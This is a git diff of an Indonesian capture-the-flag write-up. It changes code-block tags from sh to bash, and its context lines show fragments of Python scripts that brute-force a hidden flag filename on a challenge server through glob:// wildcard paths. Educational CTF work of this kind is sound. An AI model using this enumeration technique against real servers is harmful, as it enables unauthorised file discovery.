@@ -182,7 +182,7 @@ Ketika menggunakan tanda * dalam pencarian, maka karakter tersebut akan dianggap
 
 Contohnya, jika kita ingin mencari semua file yang berakhiran `.txt` dalam sebuah direktori, kita bisa menggunakan perintah `ls *.txt.` Pada contoh ini, tanda `*` berfungsi sebagai wildcard yang digunakan untuk menggantikan karakter apa pun yang ada di awal nama file dan menemukan semua file yang berakhiran `.txt` atau bisa saja kita simulasikan dengan soal yang diberikan `ls flag*` 
 
-```sh
+```bash
 noob@codes:~$ ls flag*
 -rw-rw-r-- 1 noob noob 39 Mar  24 11:39 flag.txt
 
@@ -206,7 +206,7 @@ noob = requests.get(
 )
 print(noob.text)
 ```
-```sh
+```bash
 noob@codes:~$ python chall.py
 39
 
@@ -225,7 +225,7 @@ for brute in karakter:
 	getflag = str("glob:///tmp/chall/" + "".join(clue) + brute)
 	print(getflag)
 ```
-```sh
+```bash
 noob@codes:~$ python brute.py
 glob:///tmp/chall/flaga
 glob:///tmp/chall/flagb
@@ -288,7 +288,7 @@ for brute in karakter:
 		print(kirim)
 		print(noob.text)
 ```
-```sh
+```bash
 noob@codes:~$ python brute-debug.py
 glob:///tmp/chall/flaga*
 
@@ -366,7 +366,7 @@ for brute in karakter:
 			print("Berhasil Mendapatkan karakter : " + brute)
 			break
 ```
-```sh
+```bash
 noob@codes:~$ python brute-debug2.py
 Berhasil Mendapatkan karakter : 1
 ```
@@ -402,7 +402,7 @@ while len(clue) != 19:
             print("Sukses : " + "".join(clue) + ".txt")
             break
 ```
-```sh
+```bash
 noob@codes:~$ python final-brute.py
 Sukses : flag1.txt
 Sukses : flag16.txt
@@ -434,7 +434,7 @@ noob = requests.get(url)
 
 print(noob.text)
 ```
-```sh
+```bash
 noob@codes:~$ python getflag.py
 Selamat Menunaikan Ibadah Puasa 1444 H
 ```
